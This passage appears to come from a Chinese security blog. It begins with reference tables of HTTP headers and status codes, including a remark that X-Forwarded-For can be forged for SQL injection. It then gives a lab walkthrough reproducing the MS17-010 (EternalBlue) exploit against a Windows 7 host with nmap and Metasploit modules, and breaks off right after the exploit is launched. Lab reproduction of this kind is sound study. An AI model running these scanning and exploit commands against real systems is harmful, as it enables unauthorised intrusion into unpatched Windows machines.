<td align="left">仅请求某个实体的一部分。字节偏移以0开始。</td>
<td align="left">Range: bytes=500-999</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Referer</td>
<td align="left">表示浏览器所访问的前一个页面，正是那个页面上的某个链接将浏览器带到了当前所请求的这个页面。</td>
<td align="left">Referer: <a href="http://en.wikipedia.org/wiki/Main_Page">http://en.wikipedia.org/wiki/Main_Page</a></td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">TE</td>
<td align="left">浏览器预期接受的传输编码方式：可使用回应协议头 Transfer-Encoding 字段中的值；另外还可用”trailers”（与”分块 “传输方式相关）这个值来表明浏览器希望在最后一个尺寸为0的块之后还接收到一些额外的字段。</td>
<td align="left">TE: trailers, <a href="https://zh.wikipedia.org/wiki/DEFLATE">deflate</a></td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">User-Agent</td>
<td align="left">浏览器的身份标识字符串</td>
<td align="left">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/21.0</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Upgrade</td>
<td align="left">要求服务器升级到另一个协议。</td>
<td align="left">Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Via</td>
<td align="left">向服务器告知，这个请求是由哪些代理发出的。</td>
<td align="left">Via: 1.0 fred, 1.1 example.com (Apache/1.1)</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Warning</td>
<td align="left">一个一般性的警告，告知，在实体内容体中可能存在错误。</td>
<td align="left">Warning: 199 Miscellaneous warning</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Cookie</td>
<td align="left">之前由服务器通过 Set-Cookie发送的一个超文本传输协议Cookie</td>
<td align="left">Cookie: $Version=1; Skin=new;</td>
<td align="left">常设: 标准</td>
</tr>
<tr>
<td align="left">Origin</td>
<td align="left">跳转来源域名（要求服务器在回应中加入一个‘访问控制-允许来源’（’Access-Control-Allow-Origin’）字段）。</td>
<td align="left">Origin: <a href="http://www.example-social-network.com/">http://www.example-social-network.com</a></td>
<td align="left">常设: 标准</td>
</tr>
<tr>
<td align="left">Pragma</td>
<td align="left">与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。</td>
<td align="left">Pragma: no-cache</td>
<td align="left">常设但不常用</td>
</tr>
<tr>
<td align="left">Content-MD5</td>
<td align="left">请求体的内容的二进制 MD5 散列值，以 Base64 编码的结果</td>
<td align="left">Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</td>
<td align="left">过时的</td>
</tr>
<tr>
<td align="left">Accept-Datetime</td>
<td align="left">能够接受的按照时间来表示的版本</td>
<td align="left">Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT</td>
<td align="left">临时</td>
</tr>
</tbody></table>
<p>常见的非标准请求字段</p>
<table>
<thead>
<tr>
<th align="left">字段名</th>
<th align="left">说明</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">X-Requested-With</td>
<td align="left">主要用于标识 Ajax 及可扩展标记语言 请求。大部分的JavaScript框架会发送这个字段，且将其值设置为 XMLHttpRequest</td>
<td align="left">X-Requested-With: XMLHttpRequest</td>
</tr>
<tr>
<td align="left">DNT</td>
<td align="left">请求某个网页应用程序停止跟踪某个用户。在火狐浏览器中，相当于X-Do-Not-Track协议头字段（自 Firefox/4.0 Beta 11 版开始支持）。Safari 和 Internet Explorer 9 也支持这个字段。2011年3月7日，草案提交IETF。万维网协会 的跟踪保护工作组正在就此制作一项规范。</td>
<td align="left">DNT: 1 (DNT启用) DNT: 0 (DNT被禁用)</td>
</tr>
<tr>
<td align="left">X-Forwarded-For</td>
<td align="left">一个事实标准 ，用于标识某个通过超文本传输协议代理或负载均衡连接到某个网页服务器的客户端的原始互联网地址</td>
<td align="left">X-Forwarded-For: client1, proxy1, proxy2 X-Forwarded-For: 129.78.138.66, 129.78.64.103</td>
</tr>
<tr>
<td align="left">X-Forwarded-Host</td>
<td align="left">一个事实标准 ，用于识别客户端原本发出的 Host 请求头部。</td>
<td align="left">X-Forwarded-Host: en.wikipedia.org:80 X-Forwarded-Host: en.wikipedia.org</td>
</tr>
<tr>
<td align="left">X-Forwarded-Proto</td>
<td align="left">一个事实标准，用于标识某个超文本传输协议请求最初所使用的协议。</td>
<td align="left">X-Forwarded-Proto: https</td>
</tr>
<tr>
<td align="left">Front-End-Https</td>
<td align="left">被微软的服务器和负载均衡器所使用的非标准头部字段。</td>
<td align="left">Front-End-Https: on</td>
</tr>
<tr>
<td align="left">X-Http-Method-Override</td>
<td align="left">请求某个网页应用程序使用该协议头字段中指定的方法（一般是PUT或DELETE）来覆盖掉在请求中所指定的方法（一般是POST）。当某个浏览器或防火墙阻止直接发送PUT 或DELETE 方法时（注意，这可能是因为软件中的某个漏洞，因而需要修复，也可能是因为某个配置选项就是如此要求的，因而不应当设法绕过），可使用这种方式。</td>
<td align="left">X-HTTP-Method-Override: DELETE</td>
</tr>
<tr>
<td align="left">X-ATT-DeviceId</td>
<td align="left">使服务器更容易解读AT&amp;T设备User-Agent字段中常见的设备型号、固件信息。</td>
<td align="left">X-Att-Deviceid: GT-P7320/P7320XXLPG</td>
</tr>
<tr>
<td align="left">X-Wap-Profile</td>
<td align="left">链接到互联网上的一个XML文件，其完整、仔细地描述了正在连接的设备。右侧以为AT&amp;T Samsung Galaxy S2提供的XML文件为例。</td>
<td align="left">x-wap-profile: <a href="http://wap.samsungmobile.com/uaprof/SGH-I777.xml">http://wap.samsungmobile.com/uaprof/SGH-I777.xml</a></td>
</tr>
<tr>
<td align="left">Proxy-Connection</td>
<td align="left">该字段源于早期超文本传输协议版本实现中的错误。与标准的连接（Connection）字段的功能完全相同。</td>
<td align="left">Proxy-Connection: keep-alive</td>
</tr>
<tr>
<td align="left">X-Csrf-Token</td>
<td align="left">用于防止 跨站请求伪造。 辅助用的头部有 X-CSRFToken或 X-XSRF-TOKEN</td>
<td align="left">X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</td>
</tr>
</tbody></table>
<p>响应字段</p>
<table>
<thead>
<tr>
<th align="left">字段名</th>
<th align="left">说明</th>
<th align="left">例子</th>
<th align="left">状态</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Accept-Patch</td>
<td align="left">指定服务器支持的文件格式类型。</td>
<td align="left">Accept-Patch: text/example;charset=utf-8</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Accept-Ranges</td>
<td align="left">这个服务器支持哪些种类的部分内容范围</td>
<td align="left">Accept-Ranges: bytes</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Age</td>
<td align="left">这个对象在代理缓存中存在的时间，以秒为单位</td>
<td align="left">Age: 12</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Allow</td>
<td align="left">对于特定资源有效的动作。针对HTTP/405这一错误代码而使用</td>
<td align="left">Allow: GET, HEAD</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Cache-Control</td>
<td align="left">向从服务器直到客户端在内的所有缓存机制告知，它们是否可以缓存这个对象。其单位为秒</td>
<td align="left">Cache-Control: max-age=3600</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Connection</td>
<td align="left">针对该连接所预期的选项</td>
<td align="left">Connection: close</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Content-Disposition</td>
<td align="left">一个可以让客户端下载文件并建议文件名的头部。文件名需要用双引号包裹。</td>
<td align="left">Content-Disposition: attachment; filename=”fname.ext”</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Content-Encoding</td>
<td align="left">在数据上使用的编码类型。参考 超文本传输协议压缩 。</td>
<td align="left">Content-Encoding: gzip</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Content-Language</td>
<td align="left">内容所使用的语言</td>
<td align="left">Content-Language: da</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Content-Length</td>
<td align="left">回应消息体的长度，以字节（8位为一字节）为单位</td>
<td align="left">Content-Length: 348</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Content-Location</td>
<td align="left">所返回的数据的一个候选位置</td>
<td align="left">Content-Location: /index.htm</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Content-Range</td>
<td align="left">这条部分消息是属于某条完整消息的哪个部分</td>
<td align="left">Content-Range: bytes 21010-47021/47022</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Content-Type</td>
<td align="left">当前内容的MIME类型</td>
<td align="left">Content-Type: text/html; charset=utf-8</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Date</td>
<td align="left">此条消息被发送时的日期和时间(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td>
<td align="left">Date: Tue, 15 Nov 1994 08:12:31 GMT</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">ETag</td>
<td align="left">对于某个资源的某个特定版本的一个标识符，通常是一个 消息散列</td>
<td align="left">ETag: “737060cd8c284d8af7ad3082f209582d”</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Last-Modified</td>
<td align="left">所请求的对象的最后修改日期(按照 RFC 7231 中定义的“超文本传输协议日期”格式来表示)</td>
<td align="left">Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Link</td>
<td align="left">用来表达与另一个资源之间的类型关系，此处所说的类型关系是在 RFC 5988 中定义的</td>
<td align="left">Link: ; rel=”alternate”</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Location</td>
<td align="left">用来进行重定向，或者在创建了某个新资源时使用。</td>
<td align="left">Location: <a href="http://www.w3.org/pub/WWW/People.html">http://www.w3.org/pub/WWW/People.html</a></td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">P3P</td>
<td align="left">用于支持设置P3P策略，标准格式为“P3P:CP=”your_compact_policy””。然而P3P规范并不成功，大部分现代浏览器没有完整实现该功能，而大量网站也将该值设为假值，从而足以用来欺骗浏览器的P3P插件功能并授权给第三方Cookies。</td>
<td align="left">P3P: CP=”This is not a P3P policy! See <a href="http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657">http://www.google.com/support/accounts/bin/answer.py?hl=en&amp;answer=151657</a> for more info.”</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Pragma</td>
<td align="left">与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。</td>
<td align="left">Pragma: no-cache</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Proxy-Authenticate</td>
<td align="left">要求在访问代理时提供身份认证信息。</td>
<td align="left">Proxy-Authenticate: Basic</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Public-Key-Pins</td>
<td align="left">用于缓解中间人攻击，声明网站认证使用的传输层安全协议证书的散列值</td>
<td align="left">Public-Key-Pins: max-age=2592000; pin-sha256=”E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=”;</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Retry-After</td>
<td align="left">如果某个实体临时不可用，则，此协议头用来告知客户端日后重试。其值可以是一个特定的时间段(以秒为单位)或一个超文本传输协议日期。</td>
<td align="left">Example 1: Retry-After: 120 Example 2: Retry-After: Fri, 07 Nov 2014 23:59:59 GMT</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Server</td>
<td align="left">服务器的名字</td>
<td align="left">Server: Apache/2.4.1 (Unix)</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Trailer</td>
<td align="left">这个头部数值指示了在这一系列头部信息由由分块传输编码编码。</td>
<td align="left">Trailer: Max-Forwards</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Transfer-Encoding</td>
<td align="left">用来将实体安全地传输给用户的编码形式。当前定义的方法包括：分块（chunked）、compress、deflate、gzip和identity。</td>
<td align="left">Transfer-Encoding: chunked</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Upgrade</td>
<td align="left">要求客户端升级到另一个协议。</td>
<td align="left">Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Vary</td>
<td align="left">告知下游的代理服务器，应当如何对未来的请求协议头进行匹配，以决定是否可使用已缓存的回应内容而不是重新从原始服务器请求新的内容。</td>
<td align="left">Vary: *</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Via</td>
<td align="left">告知代理服务器的客户端，当前回应是通过什么途径发送的。</td>
<td align="left">Via: 1.0 fred, 1.1 example.com (Apache/1.1)</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Warning</td>
<td align="left">一般性的警告，告知在实体内容体中可能存在错误。</td>
<td align="left">Warning: 199 Miscellaneous warning</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">WWW-Authenticate</td>
<td align="left">表明在请求获取这个实体时应当使用的认证模式。</td>
<td align="left">WWW-Authenticate: Basic</td>
<td align="left">常设</td>
</tr>
<tr>
<td align="left">Expires</td>
<td align="left">指定一个日期/时间，超过该时间则认为此回应已经过期</td>
<td align="left">Expires: Thu, 01 Dec 1994 16:00:00 GMT</td>
<td align="left">常设: 标准</td>
</tr>
<tr>
<td align="left">Set-Cookie</td>
<td align="left">HTTP cookie</td>
<td align="left">Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</td>
<td align="left">常设: 标准</td>
</tr>
<tr>
<td align="left">Strict-Transport-Security</td>
<td align="left">HTTP 严格传输安全这一头部告知客户端缓存这一强制 HTTPS 策略的时间，以及这一策略是否适用于其子域名。</td>
<td align="left">Strict-Transport-Security: max-age=16070400; includeSubDomains</td>
<td align="left">常设: 标准</td>
</tr>
<tr>
<td align="left">Content-MD5</td>
<td align="left">回应内容的二进制 MD5 散列，以 Base64 方式编码</td>
<td align="left">Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</td>
<td align="left">过时的</td>
</tr>
<tr>
<td align="left">X-Frame-Options</td>
<td align="left">点击劫持保护： deny：该页面不允许在 frame 中展示，即使是同域名内。 sameorigin：该页面允许同域名内在 frame 中展示。 allow-from uri：该页面允许在指定uri的 frame 中展示。 allowall：允许任意位置的frame显示，非标准值。</td>
<td align="left">X-Frame-Options: deny</td>
<td align="left">过时的</td>
</tr>
<tr>
<td align="left">Access-Control-Allow-Origin</td>
<td align="left">指定哪些网站可参与到跨来源资源共享过程中</td>
<td align="left">Access-Control-Allow-Origin: *</td>
<td align="left">临时</td>
</tr>
<tr>
<td align="left">Refresh</td>
<td align="left">用于设定可定时的重定向跳转。右边例子设定了5秒后跳转至“<a href="http://www.w3.org/pub/WWW/People.html%E2%80%9D%E3%80%82">http://www.w3.org/pub/WWW/People.html”。</a></td>
<td align="left">Refresh: 5; url=<a href="http://www.w3.org/pub/WWW/People.html">http://www.w3.org/pub/WWW/People.html</a></td>
<td align="left">专利并非标准 Netscape实现的扩展，但大部分网页浏览器也支持。</td>
</tr>
<tr>
<td align="left">Status</td>
<td align="left">通用网关接口 协议头字段，用来说明当前这个超文本传输协议回应的 状态 。普通的超文本传输协议回应，会使用单独的“状态行”（”Status-Line”）作为替代，这一点是在 RFC 7230 中定义的。</td>
<td align="left">Status: 200 OK</td>
<td align="left">Not listed as a registered field name</td>
</tr>
</tbody></table>
<p>常见的非标准回应字段</p>
<table>
<thead>
<tr>
<th align="left">字段名</th>
<th align="left">说明</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">X-XSS-Protection</td>
<td align="left">跨站脚本攻击 （XSS）过滤器</td>
<td align="left">X-XSS-Protection: 1; mode=block</td>
</tr>
<tr>
<td align="left">Content-Security-Policy, X-Content-Security-Policy, X-WebKit-CSP</td>
<td align="left">内容安全策略定义。</td>
<td align="left">X-WebKit-CSP: default-src ‘self’</td>
</tr>
<tr>
<td align="left">X-Content-Type-Options</td>
<td align="left">唯一允许的数值为”nosniff”，防止 Internet Explorer 对文件进行MIME类型嗅探。这也对 Google Chrome 下载扩展时适用。</td>
<td align="left">X-Content-Type-Options: nosniff</td>
</tr>
<tr>
<td align="left">X-Powered-By</td>
<td align="left">表明用于支持当前网页应用程序的技术（例如：PHP）（版本号细节通常放置在 X-Runtime 或 X-Version 中）</td>
<td align="left">X-Powered-By: PHP/5.4.0</td>
</tr>
<tr>
<td align="left">X-UA-Compatible</td>
<td align="left">推荐指定的渲染引擎（通常是向后兼容模式）来显示内容。也用于激活 Internet Explorer 中的 Chrome Frame。</td>
<td align="left">X-UA-Compatible: IE=EmulateIE7 X-UA-Compatible: IE=edge X-UA-Compatible: Chrome=1</td>
</tr>
<tr>
<td align="left">X-Content-Duration</td>
<td align="left">指出音视频的长度，单位为秒。只受Gecko内核浏览器支持。</td>
<td align="left">X-Content-Duration: 42.666</td>
</tr>
<tr>
<td align="left">Feature-Policy</td>
<td align="left">管控特定应用程序接口</td>
<td align="left">Feature-Policy: vibrate ‘none’; geolocation ‘none’</td>
</tr>
<tr>
<td align="left">Permissions-Policy</td>
<td align="left">管控特定应用程序接口为W3C标准 替代Feature-Policy</td>
<td align="left">Permissions-Policy: microphone=(),geolocation=(),camera=()</td>
</tr>
<tr>
<td align="left">X-Permitted-Cross-Domain-Policies</td>
<td align="left">Flash的跨网站攻击防御</td>
<td align="left">X-Permitted-Cross-Domain-Policies: none</td>
</tr>
<tr>
<td align="left">Referrer-Policy</td>
<td align="left">保护信息泄漏</td>
<td align="left">Referrer-Policy: origin-when-cross-origin</td>
</tr>
<tr>
<td align="left">Expect-CT</td>
<td align="left">防止欺骗 SSL，单位为秒</td>
<td align="left">Expect-CT: max-age=31536000, enforce</td>
</tr>
</tbody></table>
<p><strong>X-Forwarder-For</strong></p>
<p>60.12.15.50(出口ip) -&gt;45.67.45.32(代理ip) -&gt; 1114.114.114.114(目的ip)</p>
<p>X-Forwarder-For： 60.12.15.50,45.67.45.32(可伪造，进行SQL注入)</p>
<p>CLIENT_IP: 60.12.15.50</p>
<p>REMOTE_IP: 45.67.45.32</p>
<p>HTTP响应码</p>
<table>
<thead>
<tr>
<th align="left">状态码</th>
<th align="left">状态码英文名称</th>
<th align="left">中文描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1**</td>
<td align="left"></td>
<td align="left">信息，服务器收到请求，需要请求者继续执行操作</td>
</tr>
<tr>
<td align="left">100</td>
<td align="left">Continue</td>
<td align="left">继续。客户端应继续其请求</td>
</tr>
<tr>
<td align="left">101</td>
<td align="left">Switching Protocols</td>
<td align="left">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">2**</td>
<td align="left"></td>
<td align="left">成功，操作被成功接收并处理</td>
</tr>
<tr>
<td align="left">200</td>
<td align="left">OK</td>
<td align="left">请求成功。一般用于GET与POST请求</td>
</tr>
<tr>
<td align="left">201</td>
<td align="left">Created</td>
<td align="left">已创建。成功请求并创建了新的资源</td>
</tr>
<tr>
<td align="left">202</td>
<td align="left">Accepted</td>
<td align="left">已接受。已经接受请求，但未处理完成</td>
</tr>
<tr>
<td align="left">203</td>
<td align="left">Non-Authoritative Information</td>
<td align="left">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td>
</tr>
<tr>
<td align="left">204</td>
<td align="left">No Content</td>
<td align="left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
</tr>
<tr>
<td align="left">205</td>
<td align="left">Reset Content</td>
<td align="left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td>
</tr>
<tr>
<td align="left">206</td>
<td align="left">Partial Content</td>
<td align="left">部分内容。服务器成功处理了部分GET请求</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3**</td>
<td align="left"></td>
<td align="left">重定向，需要进一步的操作以完成请求</td>
</tr>
<tr>
<td align="left">300</td>
<td align="left">Multiple Choices</td>
<td align="left">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td>
</tr>
<tr>
<td align="left">301</td>
<td align="left">Moved Permanently</td>
<td align="left">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td>
</tr>
<tr>
<td align="left">302</td>
<td align="left">Found</td>
<td align="left">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td>
</tr>
<tr>
<td align="left">303</td>
<td align="left">See Other</td>
<td align="left">查看其它地址。与301类似。使用GET和POST请求查看</td>
</tr>
<tr>
<td align="left">304</td>
<td align="left">Not Modified</td>
<td align="left">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td>
</tr>
<tr>
<td align="left">305</td>
<td align="left">Use Proxy</td>
<td align="left">使用代理。所请求的资源必须通过代理访问</td>
</tr>
<tr>
<td align="left">306</td>
<td align="left">Unused</td>
<td align="left">已经被废弃的HTTP状态码</td>
</tr>
<tr>
<td align="left">307</td>
<td align="left">Temporary Redirect</td>
<td align="left">临时重定向。与302类似。使用GET请求重定向</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">4**</td>
<td align="left"></td>
<td align="left">客户端错误，请求包含语法错误或无法完成请求</td>
</tr>
<tr>
<td align="left">400</td>
<td align="left">Bad Request</td>
<td align="left">客户端请求的语法错误，服务器无法理解</td>
</tr>
<tr>
<td align="left">401</td>
<td align="left">Unauthorized</td>
<td align="left">请求要求用户的身份认证</td>
</tr>
<tr>
<td align="left">402</td>
<td align="left">Payment Required</td>
<td align="left">保留，将来使用</td>
</tr>
<tr>
<td align="left">403</td>
<td align="left">Forbidden</td>
<td align="left">服务器理解请求客户端的请求，但是拒绝执行此请求（文件夹是存在的）</td>
</tr>
<tr>
<td align="left">404</td>
<td align="left">Not Found</td>
<td align="left">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面（客户端请求文件或文件夹不存在）</td>
</tr>
<tr>
<td align="left">405</td>
<td align="left">Method Not Allowed</td>
<td align="left">客户端请求中的方法被禁止</td>
</tr>
<tr>
<td align="left">406</td>
<td align="left">Not Acceptable</td>
<td align="left">服务器无法根据客户端请求的内容特性完成请求</td>
</tr>
<tr>
<td align="left">407</td>
<td align="left">Proxy Authentication Required</td>
<td align="left">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td>
</tr>
<tr>
<td align="left">408</td>
<td align="left">Request Time-out</td>
<td align="left">服务器等待客户端发送的请求时间过长，超时</td>
</tr>
<tr>
<td align="left">409</td>
<td align="left">Conflict</td>
<td align="left">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td>
</tr>
<tr>
<td align="left">410</td>
<td align="left">Gone</td>
<td align="left">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td>
</tr>
<tr>
<td align="left">411</td>
<td align="left">Length Required</td>
<td align="left">服务器无法处理客户端发送的不带Content-Length的请求信息</td>
</tr>
<tr>
<td align="left">412</td>
<td align="left">Precondition Failed</td>
<td align="left">客户端请求信息的先决条件错误</td>
</tr>
<tr>
<td align="left">413</td>
<td align="left">Request Entity Too Large</td>
<td align="left">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td>
</tr>
<tr>
<td align="left">414</td>
<td align="left">Request-URI Too Large</td>
<td align="left">请求的URI过长（URI通常为网址），服务器无法处理</td>
</tr>
<tr>
<td align="left">415</td>
<td align="left">Unsupported Media Type</td>
<td align="left">服务器无法处理请求附带的媒体格式</td>
</tr>
<tr>
<td align="left">416</td>
<td align="left">Requested range not satisfiable</td>
<td align="left">客户端请求的范围无效</td>
</tr>
<tr>
<td align="left">417</td>
<td align="left">Expectation Failed</td>
<td align="left">服务器无法满足Expect的请求头信息</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">5**</td>
<td align="left"></td>
<td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td>
</tr>
<tr>
<td align="left">500</td>
<td align="left">Internal Server Error</td>
<td align="left">服务器内部错误，无法完成请求</td>
</tr>
<tr>
<td align="left">501</td>
<td align="left">Not Implemented</td>
<td align="left">服务器不支持请求的功能，无法完成请求</td>
</tr>
<tr>
<td align="left">502</td>
<td align="left">Bad Gateway</td>
<td align="left">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td>
</tr>
<tr>
<td align="left">503</td>
<td align="left">Service Unavailable</td>
<td align="left">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td>
</tr>
<tr>
<td align="left">504</td>
<td align="left">Gateway Time-out</td>
<td align="left">充当网关或代理的服务器，未及时从远端服务器获取请求</td>
</tr>
<tr>
<td align="left">505</td>
<td align="left">HTTP Version not supported</td>
<td align="left">服务器不支持请求的HTTP协议的版本，无法完成处理</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>网络基础</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>MS17-010漏洞复现</title>
    <url>/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
<h1 id="二、探测"><a href="#二、探测" class="headerlink" title="二、探测"></a>二、探测</h1><p>靶机：win7 x64 sp1 IP：192.168.66.98<br>攻击机：kali 2020.4 IP：192.168.66.138</p>
<h2 id="1、通过nmap扫描目标机器，发现139、445端口"><a href="#1、通过nmap扫描目标机器，发现139、445端口" class="headerlink" title="1、通过nmap扫描目标机器，发现139、445端口"></a>1、通过nmap扫描目标机器，发现139、445端口</h2><pre class="highlight"><span class="line">nmap -V -T4 192.168.66.98   </span><br><span class="line">#T4设置扫描速度，越高越快（1-5）</span><br><span class="line">#-V显示详情</span><br></pre>

<p>结果：</p>
<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" alt="image-20210809161636575" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" class="lozad post-image"></p>
<h2 id="2、使用msf探测是否存在MS17-010漏洞"><a href="#2、使用msf探测是否存在MS17-010漏洞" class="headerlink" title="2、使用msf探测是否存在MS17-010漏洞"></a>2、使用msf探测是否存在MS17-010漏洞</h2><p>a、寻找MS17-010模块</p>
<pre class="highlight"><span class="line">search MS17-010</span><br></pre>

<p>发现2个探测模块和4个利用模块</p>
<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" alt="image-20210809161651064" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" class="lozad post-image"></p>
<h2 id="3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测"><a href="#3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测" class="headerlink" title="3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测"></a>3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测</h2><pre class="highlight"><span class="line">use auxiliary/scanner/smb/smb_ms17_010   	#调用探测模块</span><br><span class="line">show options                 				#显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98          			#设置目标IP</span><br><span class="line">run                     					#运行探测程序</span><br></pre>

<p>探测出存在MS17-010漏洞</p>
<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" alt="image-20210809161701790" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" class="lozad post-image"></p>
<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><h2 id="1、使用攻击模块对靶机发起攻击"><a href="#1、使用攻击模块对靶机发起攻击" class="headerlink" title="1、使用攻击模块对靶机发起攻击"></a>1、使用攻击模块对靶机发起攻击</h2><pre class="highlight"><span class="line">use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块</span><br><span class="line">show options                                    #显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98                        #设置目标IP</span><br><span class="line">run                                             #运行探测程序</span><br></pre>

